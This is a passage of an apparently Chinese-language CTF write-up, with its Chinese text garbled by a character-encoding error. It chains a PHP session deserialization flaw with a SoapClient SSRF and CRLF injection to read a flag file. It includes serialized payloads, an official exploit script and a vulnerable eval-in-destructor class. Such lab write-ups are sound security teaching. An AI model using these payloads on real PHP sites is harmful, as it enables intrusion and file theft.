<strong>sessionååºåˆ—+soap(ssrf+crlf)+call_user_funcæ¿€æ´»soapç±»</strong></p><h6 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ifÂ (isset($_GET[&#x27;d0g3&#x27;]))Â &#123;             </span><br><span class="line">Â Â Â Â ini_set($_GET[&#x27;baby&#x27;],Â $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;è®¾ç½®çš„å¼•æ“&#x27;);</span><br><span class="line">Â Â Â Â session_start();</span><br><span class="line">Â Â Â Â $_SESSION[&#x27;sess&#x27;]Â =Â $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure><ul><li>å¯¹äºè¿™æ®µä»£ç ï¼Œæˆ‘ä»¬<code>ini_set($_GET[&#39;baby&#39;], $_GET[&#39;d0g3&#39;]); æ„é€ æˆini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</code>[ä¹‹å‰phpinfoå¯ä»¥æŸ¥çœ‹åˆ°æœ¬æ¥çš„å¼•æ“ä¸ºphp]</li><li>ç„¶å<code>$_SESSION[&#39;sess&#39;] = $_POST[&#39;sess&#39;];</code>è¿™é‡Œå…è®¸æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªsesså˜é‡çš„sessionï¼Œä¹Ÿå°±å¯¹åº”<code>call_user_func</code>é‡Œé¢çš„<code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code>ä¸­çš„<code>reset($_SESSION)</code>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è®©sessä¸ºSoapClientè¿™ä¸ªç±»ï¼Œaéšä¾¿å–ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œåˆ™åŸæ¥è¿™å¥è¯å°±å˜æˆäº†<code>call_user_func(SoapClient-&gt;aaa));</code>ï¼Œå°±èƒ½æˆåŠŸè§¦å‘soapcilent-&gt;__callä»è€Œè¿›è¡Œssrfã€‚</li><li>ç°åœ¨å°±æ˜¯æƒ³åŠæ³•é€šè¿‡popé“¾è§¦å‘<code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code>ä»è€Œssrfã€‚</li><li>è¿™ä¸ªæ—¶å€™å°±æ˜¯è¿ç”¨sessionçš„æœºåˆ¶</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;,&#x27;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&#x27; ));            </span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">//åˆ©ç”¨SoapClientè°ƒç”¨__callæ¥å‘èµ·httpè¯·æ±‚è®¿é—®flag.phpï¼Œç»•è¿‡only localhostçš„é™åˆ¶</span><br></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬å…ˆåˆ©ç”¨crlfä¼ªé€ è¯·æ±‚å»è®¿é—®flag.phpå¹¶å°†ç»“æœä¿å­˜åœ¨cookieä¸ºsession&#x3D;ã€æ‰§è¡Œåçš„sessionIDã€‘ä¸­</li><li>äºæ˜¯æˆ‘ä»¬å…ˆä¼ sessä¸ºä¸Šè¿°çš„pocã€æ³¨æ„æ ¼å¼ <code>åºåˆ—åŒ–å†…å®¹</code>ã€‘</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ifÂ (isset($_GET[&#x27;d0g3&#x27;]))Â &#123;             </span><br><span class="line">Â Â Â Â ini_set($_GET[&#x27;baby&#x27;],Â $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;è®¾ç½®çš„å¼•æ“&#x27;);</span><br><span class="line">Â Â Â Â session_start();</span><br><span class="line">Â Â Â Â $_SESSION[&#x27;sess&#x27;]Â =Â $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">Â Â Â Â session_start();</span><br><span class="line">Â Â Â Â ifÂ (isset($_POST[&quot;pop&quot;]))Â &#123;</span><br><span class="line">Â Â Â Â Â Â Â Â unserialize($_POST[&quot;pop&quot;]);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆæ˜¯è¿›å…¥ç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œsessä¼ è¿›å»ï¼Œç„¶åä¸ä¼ dog3</li><li>å°±ä¼šè¿›å…¥elseï¼Œå…ˆsession startè¯»å–æˆ‘ä»¬ä¼ çš„sessï¼Œå¹¶ä¸”ååºåˆ—åŒ–popï¼Œæˆ‘ä»¬è¿™ä¸ªæ—¶å€™ä¼ æ„é€ çš„é“¾å­ï¼Œè§¦å‘call_user_funcï¼Œé‡Œé¢çš„reset(session)å°±æ˜¯æˆ‘ä»¬æ„é€ çš„SoapClientå’¯</li><li>äºæ˜¯æˆåŠŸè·å¾—flagï¼Œå­˜è¿›ä¸€ä¸ªæ–°çš„sessioné‡Œé¢</li><li>å¤åˆ¶ä¸€ä¸‹seesionï¼Œè®¿é—®index.phpï¼Œè¾“å‡ºflag</li></ul><hr><h6 id="æŠ„ï¼šhurrisonä½¬çš„wp"><a href="#æŠ„ï¼šhurrisonä½¬çš„wp" class="headerlink" title="æŠ„ï¼šhurrisonä½¬çš„wp"></a>æŠ„ï¼šhurrisonä½¬çš„wp</h6><p>æŸ¥çœ‹ phpinfoå‘ç°session.serialize_handler&#x3D;phpï¼Œ<code>ini_set($_GET[&#39;baby&#39;], $_GET[&#39;d0g3&#39;]);</code>å¯ä»¥è®¾ç½® php_serialize</p><p>åˆ©ç”¨sessionåºåˆ—åŒ–ä¸ä¸€è‡´ï¼Œæ ¹æ®flag.phpï¼Œ æ„é€ $_SESSION[â€˜sessâ€™] å¯¹è±¡ï¼Œåˆ° call_user_func(â€¦) æ‰§è¡Œï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ SoapClient è°ƒç”¨ä»»æ„ä¸å­˜åœ¨çš„æ–¹æ³•é€ æˆssrfè®¿é—®flag.php</p><p>é¦–å…ˆæ ¹æ®æç¤ºï¼Œåˆ©ç”¨GlobIteratoræŸ¥æ‰¾æ ¹ç›®å½•æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;,&#x27;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&#x27; ));            </span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">//åˆ©ç”¨SoapClientè°ƒç”¨__callæ¥å‘èµ·httpè¯·æ±‚è®¿é—®flag.phpï¼Œç»•è¿‡only localhostçš„é™åˆ¶</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>var_dump($_SESSION);</code> æ‹¿åˆ° sessionid è®¾ç½®åå†è®¿é—®ï¼Œæ‹¿åˆ°flagæ–‡ä»¶å <code>f1111llllllaagg</code></p><p>å¦è§£ï¼š<code>new DirextoryIterator(&#39;glod://f*&#39;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230707013038305-1024x357.png"></p><p>å†åˆ©ç”¨SplFileObjectè¯»flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&#x27;, &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure><h6 id="å®˜æ–¹wp"><a href="#å®˜æ–¹wp" class="headerlink" title="å®˜æ–¹wp"></a>å®˜æ–¹wp</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?baby=session.serialize_handler&amp;d0g3=php_serialize</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*è¯»æ–‡ä»¶å*/</span><br><span class="line">$target = &quot;http://127.0.0.1/flag.php?a=DirectoryIterator&amp;b=glob:///f*&quot;;</span><br><span class="line">/*è¯»æ–‡ä»¶å†…å®¹*/</span><br><span class="line">//$target = &quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=/f1111llllllaagg&quot;;</span><br><span class="line"> </span><br><span class="line">$attack = new SoapClient(null,array(</span><br><span class="line">    &#x27;location&#x27;=&gt;$target,</span><br><span class="line">    &#x27;uri&#x27;=&gt;&#x27;http://127.0.0.1&#x27;,</span><br><span class="line">    &#x27;user_agent&#x27;=&gt;&quot;test\r\nCookie: PHPSESSID=vidkft3g6sgv3vbbbd5qu9aitk&quot;));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line">echo &#x27;&#x27;.$payload;</span><br><span class="line">//POST:</span><br><span class="line">//sess=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A58%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2Ff%2A%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A50%3A%22test%0D%0ACookie%3A+PHPSESSID%3Du1um0t3pnp8sg1sc8d25ueidpp%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>æµç¨‹å°±æ˜¯åœ¨index.phpä¸­åˆ©ç”¨sessionååºåˆ—åŒ–æ¼æ´ä¸Šä¼ æ„é€ å¥½çš„sessï¼Œç„¶åsessé‡Œé¢çš„ååºåˆ—åŒ–é¦–å…ˆæ˜¯åˆ©ç”¨SoapClientæ¥é€ æˆssrfä»¥localhostçš„èº«ä»½è¯·æ±‚flag.phpçš„å†…å®¹ï¼Œå¹¶ä¸”åœ¨flag.phpä¸­</p><p>1.å…ˆæ˜¯åˆ©ç”¨DirectoryIteratorè¿™ä¸ªç±»æ¥æŸ¥æ‰¾flagæ–‡ä»¶çš„æ–‡ä»¶å[å·²çŸ¥æ–‡ä»¶åœ¨æ ¹ç›®å½•]ã€‚</p><p>2.åˆ©ç”¨SplFileObjectå’Œfilterä¼ªåè®®æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagçš„å†…å®¹ã€‚</p><p>ç°åœ¨çš„ç›®æ ‡å°±æ˜¯æƒ³åŠæ³•è°ƒç”¨SoapClienté‡Œé¢çš„__Callï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘åˆ©ç”¨ä¹‹å‰popé“¾é‡Œé¢çš„call_user_funcæ¥è°ƒç”¨éšä¾¿ä¸€ä¸ªå‡½æ•°è§¦å‘callã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éšä¾¿å†™ä¸€ä¸ªaï¼Œç„¶åä¼ å…¥æˆ‘ä»¬çš„é“¾å­ï¼ŒæŠŠè¿”å›çš„seesionIDå†™è¿›å»ï¼Œè®¿é—®index.phpï¼Œå°±æˆåŠŸçœ‹åˆ°flagã€‚</p><h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><h5 id="session-ååºåˆ—åŒ–æœºåˆ¶"><a href="#session-ååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="session ååºåˆ—åŒ–æœºåˆ¶"></a><strong>session ååºåˆ—åŒ–æœºåˆ¶</strong></h5><blockquote><p>åœ¨php.iniä¸­å­˜åœ¨session.serialize_handleré…ç½®ï¼Œå®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„<strong>å¤„ç†å™¨</strong>åå­—ï¼Œé»˜è®¤ä½¿ç”¨phpã€‚<br>phpä¸­çš„sessionä¸­çš„å†…å®¹æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„<br>å­˜å‚¨æ–¹å¼ç”±é…ç½®é¡¹session.save_handlerç¡®å®šï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚</p></blockquote><h5 id="æœºåˆ¶"><a href="#æœºåˆ¶" class="headerlink" title="æœºåˆ¶"></a>æœºåˆ¶</h5><p>åœ¨PHPä¸­sessionæœ‰ä¸¤ç§<strong>æœºåˆ¶</strong>ï¼Œåˆ†åˆ«ä¸ºé»˜è®¤æœºåˆ¶å’Œç”±ç”¨æˆ·è‡ªå®šä¹‰sessionå¤„ç†æœºåˆ¶ã€‚</p><h6 id="é»˜è®¤æœºåˆ¶"><a href="#é»˜è®¤æœºåˆ¶" class="headerlink" title="é»˜è®¤æœºåˆ¶"></a>é»˜è®¤æœºåˆ¶</h6><p>åœ¨php.iniä¸­æœ‰å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_handler = file</span><br></pre></td></tr></table></figure><p>å³ï¼Œæ˜¯ç”¨ç£ç›˜æ–‡ä»¶æ¥å®ç°PHPä¼šè¯ï¼Œå®ƒæœ‰ä»¥ä¸‹å‡ éƒ¨åˆ†ç»„æˆï¼š</p><p><strong>session_start()</strong></p><p>session_start()æ˜¯<strong>sessionæœºåˆ¶çš„å¼€å§‹</strong>ï¼Œå®ƒå…·æœ‰ä¸€å®šæ¦‚ç‡å¼€å¯åƒåœ¾å›æ”¶ã€‚è¿™ä¸ªæ¦‚ç‡æ˜¯æ ¹æ®php.iniçš„é…ç½®å†³å®šçš„ï¼Œå› ä¸ºåœ¨æœ‰çš„ç³»ç»Ÿä¸­session.gc_probability &#x3D; 0,å³æ¦‚ç‡æ˜¯0ï¼Œè¿™æ—¶å°±ä¸å…·å¤‡åƒåœ¾å›æ”¶</p><p><strong>ä¸º$_sessionèµ‹å€¼</strong></p><p>æ·»åŠ ä¸€ä¸ªæ–°å€¼åªä¼šç»´æŒåœ¨<strong>å†…å­˜</strong>ä¸­ï¼Œå½“è„šæœ¬æ‰§è¡Œç»“æŸçš„æ—¶å€™ï¼ŒæŠŠ$_sessionçš„å€¼å†™å…¥åˆ°session_idæŒ‡å®šçš„<strong>æ–‡ä»¶å¤¹</strong>ä¸­ï¼Œç„¶åå…³é—­ç›¸å…³èµ„æºã€‚è¿™ä¸ªé˜¶æ®µæœ‰å¯èƒ½æ‰§è¡Œæ›´æ”¹session_idçš„æ“ä½œï¼Œæ¯”å¦‚é”€æ¯ä¸€ä¸ªæ—§çš„session_idï¼Œç”Ÿæˆä¸€ä¸ªå…¨æ–°çš„session_idã€‚è¿™ä¸€èˆ¬ç”¨åœ¨è‡ªå®šä¹‰sessionæ“ä½œ</p><p><strong>å†™å…¥sessionæ“ä½œ</strong></p><p>åœ¨è„šæœ¬ç»“æŸçš„æ—¶å€™ä¼šæ‰§è¡Œ<strong>sessionå†™å…¥æ“ä½œ</strong>ï¼ŒæŠŠ$_sessionä¸­çš„å€¼å†™å…¥åˆ°session_idå‘½åçš„æ–‡ä»¶ä¸­ï¼Œå¯èƒ½å·²ç»å­˜åœ¨ï¼Œå¯èƒ½éœ€è¦åˆ›å»ºæ–°çš„æ–‡ä»¶ã€‚</p><p><strong>é”€æ¯session</strong></p><p>sessionå‘å‡ºå»çš„cookieä¸€èˆ¬æ˜¯<strong>å³æ—¶cookie</strong>ï¼Œä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå½“æµè§ˆå™¨å…³é—­åï¼Œæ‰ä¼šè¿‡æœŸï¼Œä½†æ˜¯å¦‚æœåªæ˜¯æƒ³é€€å‡ºç™»å½•ï¼Œè€Œä¸æ˜¯å…³é—­æµè§ˆå™¨ï¼Œé‚£ä¹ˆå°±éœ€è¦åœ¨ä»£ç é‡Œé”€æ¯sessionï¼Œæ–¹æ³•æœ‰å¾ˆå¤šã€‚</p><ul><li>setcookies(session_name(),session_id(),time()-8000000,..) <strong>é€€å‡ºç™»å½•å‰æ‰§è¡Œ</strong></li><li>usset($_SESSION); &#x2F;&#x2F;åˆ é™¤æ‰€æœ‰çš„$_SEESIONæ•°æ®ï¼Œåˆ·æ–°åï¼Œæœ‰cookieä¼ è¿‡æ¥ä½†æ˜¯æ²¡æœ‰æ•°æ®</li><li>session_destroy(); &#x2F;&#x2F;è¿™ä¸ªä½œç”¨æ›´å½»åº•ï¼Œåˆ é™¤$_SESSION åˆ é™¤sessionæ–‡ä»¶ å’Œsession_id</li></ul><h6 id="ç”¨æˆ·è‡ªå®šä¹‰sessionå¤„ç†æœºåˆ¶"><a href="#ç”¨æˆ·è‡ªå®šä¹‰sessionå¤„ç†æœºåˆ¶" class="headerlink" title="ç”¨æˆ·è‡ªå®šä¹‰sessionå¤„ç†æœºåˆ¶"></a>ç”¨æˆ·è‡ªå®šä¹‰sessionå¤„ç†æœºåˆ¶</h6><p>åœ¨php.iniä¸­æœ‰å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_handler = user</span><br></pre></td></tr></table></figure><p><strong>session_start()</strong></p><p>æ‰§è¡Œopen($save_path,$session_name)è¯­å¥æ‰“å¼€sessionæ“ä½œå¥æŸ„æ‰§è¡Œread($id)ä»ä¸­è¯»å–æ•°æ®</p><p><strong>æ³¨æ„</strong>ï¼š$save_pathåœ¨æ­¤æƒ…å†µä¸‹ç›´æ¥è¿”å›true</p><p><strong>è„šæœ¬æ‰§è¡Œç»“æŸ</strong></p><p>æ‰§è¡Œwrite($id,$sess_data)è¯­å¥</p><p><strong>é”€æ¯session</strong></p><p>éœ€è¦æ³¨æ„å¦‚æœç”¨æˆ·éœ€è¦é”€æ¯sessionåˆ™è¦å…ˆæ‰§è¡Œdestroyå†æ‰§è¡Œç¬¬2æ­¥</p><h5 id="å¼•æ“"><a href="#å¼•æ“" class="headerlink" title="å¼•æ“"></a>å¼•æ“</h5><p><code>session.serialize_handler</code>æ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—è¯<strong>å¼•æ“</strong>çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚</p><ul><li><strong>php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</strong></li><li><strong>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</strong></li><li><strong>php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</strong></li></ul><p>åœ¨PHPä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç <code>ini_set(&#39;session.serialize_handler&#39;, &#39;éœ€è¦è®¾ç½®çš„å¼•æ“&#39;);</code></p><blockquote><p>PHPä¸­sessionæœ¬èº«çš„åºåˆ—åŒ–<strong>æœºåˆ¶</strong>æ˜¯æ²¡æœ‰é—®é¢˜çš„<br>é—®é¢˜å‡ºåœ¨äº†å¦‚æœåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶é€‰æ‹©çš„<strong>å¼•æ“ä¸åŒ</strong>ï¼Œå°±ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜<br>å½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œphpå¼•æ“ä¼šä»¥ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ï¼Œå¯¹valueå¤šè¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–ï¼Œè¾¾åˆ°æˆ‘ä»¬è§¦å‘ååºåˆ—åŒ–çš„ç›®çš„</p></blockquote><h5 id="æ¼æ´å®ä¾‹"><a href="#æ¼æ´å®ä¾‹" class="headerlink" title="æ¼æ´å®ä¾‹"></a>æ¼æ´å®ä¾‹</h5><p>å­˜åœ¨s1.phpå’Œus2.php,ä¸¤ä¸ªæ–‡ä»¶æ‰€ä½¿ç”¨çš„çš„sessionå¼•æ“ä¸ä¸€æ ·ï¼Œå°±å½¢æˆäº†ä¸€ä¸ªæ¼æ´ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//s1.phpä¸­ï¼Œä½¿ç”¨php_seriliseæ¥å¤„ç†sessionã€‚</span><br><span class="line">//php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</span><br><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//us2.phpä¸­ï¼Œç”¨phpæ¥å¤„ç†session</span><br><span class="line">//php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">classlemon&#123;</span><br><span class="line">Â Â Â Â var$hi;</span><br><span class="line">Â Â Â Â function__construct()&#123;</span><br><span class="line">            $this-&gt;hi=&#x27;phpinfo();&#x27;;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">Â Â Â Â </span><br><span class="line">Â Â Â Â function__destruct()&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â eval($this-&gt;hi);</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘ä»¬è®¿é—®s1,phpæ—¶ï¼Œæ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locallhost/s1.php?a=O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ä¼ è¿›å»çš„ a åœ¨s1.phpä¸­è¿›è¡Œåºåˆ—åŒ–ï¼Œå¼•æ“æ˜¯php_serializeï¼Œ</p><p>æ‰€ä»¥æœ€åå­˜å‚¨çš„å†…å®¹æ˜¯ï¼š</p><p><code>a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175904124-1-1024x227.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175845894-1-1024x91.png"></p><p>ç„¶è€Œï¼Œåœ¨us2.phpä¸­ï¼Œæˆ‘ä»¬è¯»å–æ•°æ®å´é€‰æ‹©çš„phpï¼Œæ­¤æ—¶è¯»å–çš„å†…å®¹å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;] =&gt; __PHP_Incomplete_Class Object</span><br><span class="line">        (</span><br><span class="line">            [__PHP_Incomplete_Class_Name] =&gt; lemon</span><br><span class="line">            [hi] =&gt; echo &quot;spoock&quot;;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [spoock] =&gt; O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬ä½¿ç”¨PHPå¼•æ“çš„æ—¶å€™ï¼ŒPHPå¼•æ“ä¼šç”¨ ä½œä¸º key å’Œ value çš„åˆ†éš”ç¬¦ï¼Œå°±ä¼šå°†<code> `a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;</code>ä½œä¸ºsessionçš„keyï¼Œå°†<code>O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code>ä½œä¸ºvalueï¼Œè¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šå¾—åˆ°lemonè¿™ä¸ªç±»ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è®¿é—®us2.phpçš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œæˆ‘ä»¬å†™å…¥çš„echo spockè¿™ä¸ªæ“ä½œã€‚</p><h5 id="PHPåŸç”Ÿç±»çš„åˆ©ç”¨"><a href="#PHPåŸç”Ÿç±»çš„åˆ©ç”¨" class="headerlink" title="PHPåŸç”Ÿç±»çš„åˆ©ç”¨"></a>PHPåŸç”Ÿç±»çš„åˆ©ç”¨</h5><blockquote><p>å¼•è¨€ï¼šæ–‡ç« å›´ç»•ç€ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœåœ¨ä»£ç å®¡è®¡ä¸­æœ‰ååºåˆ—åŒ–ç‚¹ï¼Œä½†æ˜¯åœ¨åŸæœ¬çš„ä»£ç ä¸­æ‰¾ä¸åˆ°popé“¾è¯¥å¦‚ä½•?</p></blockquote><p>å‚è€ƒï¼š<a 